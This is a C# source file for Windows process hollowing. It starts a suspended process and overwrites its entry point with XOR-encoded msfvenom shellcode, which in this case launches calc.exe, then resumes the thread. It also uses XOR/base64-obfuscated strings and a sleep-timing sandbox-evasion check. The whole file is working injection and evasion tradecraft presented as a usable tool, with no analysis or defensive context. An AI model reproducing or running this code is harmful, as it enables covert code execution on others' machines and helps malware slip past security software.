using System;
using static Process_Hollowing.Imports.Imports;

namespace Process_Hollowing
{
    class Program
    {
        public static void _b51d51772e234b338052e61789af57c7()
        {
            var rand = new Random();
            uint randTime = (uint)rand.Next(10000, 20000);
            double decide = randTime / 1000 - 0.5;
            DateTime now = DateTime.Now;
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("PkxvQ2ZUBlVdUVlVQUtbS0VLHUUXSgBOV11QEUZBWhcGQQRWAEZWBkFdAEREV1lBTwMa"), "ef2c58c0-872a-49e0-879e-834bf557c7e2")), randTime / 1000);
            Sleep(randTime);
            if (DateTime.Now.Subtract(now).TotalSeconds < decide)
            {
                return;
            }
        }

        public static void _74ad10f849bd4e798e484d836f9403c3()
        {
            PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
            STARTUPINFO startup_info = new STARTUPINFO();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            string path = System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("Il9rOGMKVgVCFBdrOH5NEEFSQFEAa2peRFRfC0MXTVIeAA=="), "ae7d4c8a-cd7d-4c57-b276-277d0cc7fe0b"));
            bool procINIT = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED,
                IntPtr.Zero, null, ref startup_info, ref proc_info);
            if (procINIT == true)
            {
                Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("PRxoRWBFXFdIQkQTV19RVRFRDUoUUVVIQxFUQVhbH08="), "f65e0734-1734-44e4-9a26-0b2447faad6c")));
                Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("ahxtEmMWVlpIEkQWeWkORENTUA=="), "16023d99-a760-4d8c-917f-d59fb79b334f")), proc_info.dwProcessId);
            }
            else
            {
                Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("Yk4/RnFeFAlJQlhcRA1XRl0FWQcZFgxIGRJKXVdcR0Qb"), "9cbf21ae-b630-448d-b9bd-9b824947502b")));
            }

            // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp EXITFUNC=thread --encrypt xor --encrypt-key z
            byte[] buf = new byte[276] {
                0x86,0x32,0xf9,0x9e,0x8a,0x92,0xba,0x7a,0x7a,0x7a,0x3b,0x2b,0x3b,0x2a,0x28,
                0x2b,0x2c,0x32,0x4b,0xa8,0x1f,0x32,0xf1,0x28,0x1a,0x32,0xf1,0x28,0x62,0x32,
                0xf1,0x28,0x5a,0x32,0xf1,0x08,0x2a,0x32,0x75,0xcd,0x30,0x30,0x37,0x4b,0xb3,
                0x32,0x4b,0xba,0xd6,0x46,0x1b,0x06,0x78,0x56,0x5a,0x3b,0xbb,0xb3,0x77,0x3b,
                0x7b,0xbb,0x98,0x97,0x28,0x3b,0x2b,0x32,0xf1,0x28,0x5a,0xf1,0x38,0x46,0x32,
                0x7b,0xaa,0xf1,0xfa,0xf2,0x7a,0x7a,0x7a,0x32,0xff,0xba,0x0e,0x1d,0x32,0x7b,
                0xaa,0x2a,0xf1,0x32,0x62,0x3e,0xf1,0x3a,0x5a,0x33,0x7b,0xaa,0x99,0x2c,0x32,
                0x85,0xb3,0x3b,0xf1,0x4e,0xf2,0x32,0x7b,0xac,0x37,0x4b,0xb3,0x32,0x4b,0xba,
                0xd6,0x3b,0xbb,0xb3,0x77,0x3b,0x7b,0xbb,0x42,0x9a,0x0f,0x8b,0x36,0x79,0x36,
                0x5e,0x72,0x3f,0x43,0xab,0x0f,0xa2,0x22,0x3e,0xf1,0x3a,0x5e,0x33,0x7b,0xaa,
                0x1c,0x3b,0xf1,0x76,0x32,0x3e,0xf1,0x3a,0x66,0x33,0x7b,0xaa,0x3b,0xf1,0x7e,
                0xf2,0x32,0x7b,0xaa,0x3b,0x22,0x3b,0x22,0x24,0x23,0x20,0x3b,0x22,0x3b,0x23,
                0x3b,0x20,0x32,0xf9,0x96,0x5a,0x3b,0x28,0x85,0x9a,0x22,0x3b,0x23,0x20,0x32,
                0xf1,0x68,0x93,0x2d,0x85,0x85,0x85,0x27,0x32,0xc0,0x7b,0x7a,0x7a,0x7a,0x7a,
                0x7a,0x7a,0x7a,0x32,0xf7,0xf7,0x7b,0x7b,0x7a,0x7a,0x3b,0xc0,0x4b,0xf1,0x15,
                0xfd,0x85,0xaf,0xc1,0x9a,0x67,0x50,0x70,0x3b,0xc0,0xdc,0xef,0xc7,0xe7,0x85,
                0xaf,0x32,0xf9,0xbe,0x52,0x46,0x7c,0x06,0x70,0xfa,0x81,0x9a,0x0f,0x7f,0xc1,
                0x3d,0x69,0x08,0x15,0x10,0x7a,0x23,0x3b,0xf3,0xa0,0x85,0xaf,0x19,0x1b,0x16,
                0x19,0x54,0x1f,0x02,0x1f,0x7a };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            }

            uint retLength = 0;
            IntPtr procHandle = proc_info.hProcess;
            IntPtr threadHandle = proc_info.hThread;
            ZwQueryInformationProcess(procHandle, PROCESSBASICINFORMATION, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
            IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("Pk9oQ3tdUAVIQnYCQUgUcVwCX10SEENLDBMIAA4TUhtKVU4="), "ee5c201b-b4c2-408f-8acc-cffd43bc1e3c")), imageBaseAddr.ToString(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("TA=="), "4517de92-89e8-4418-975b-ecab51bfc8cf"))));

            byte[] baseAddrBytes = new byte[0x8];
            IntPtr lpNumberofBytesRead = IntPtr.Zero;
            ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
            IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("ORs8QlU6VVBMVgQTCg0ESk4CUA=="), "b1ab0e96-8ad0-4252-8207-442c7b42c735")), e_lfanew.ToString(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("YA=="), "843edf32-f77b-48f4-be18-61d6100778b2"))));

            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
            Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("YA=="), "843edf32-f77b-48f4-be18-61d6100778b2"))));

            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            WriteProcessMemory(procHandle, entrypointAddr, buf, buf.Length, ref lpNumberOfBytesWritten);
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(Program._42af32bf104d4f919118205ff45cd715(System.Convert.FromBase64String("aB9vFytSWV1fQBQSFERAEFENAxhjUhBYVFlaUhFCDhEBWVAcHRs="), "3527f742-94ef-4d4c-817c-904516fcd842")));
            ResumeThread(threadHandle);
        }

       public static byte[] _42af32bf104d4f919118205ff45cd715(byte[] input, string theKeystring)
       {
            byte[] theKey = System.Text.Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }



        static void Main(string[] args)
        {
            _b51d51772e234b338052e61789af57c7();
            _74ad10f849bd4e798e484d836f9403c3();
        }
    }
}
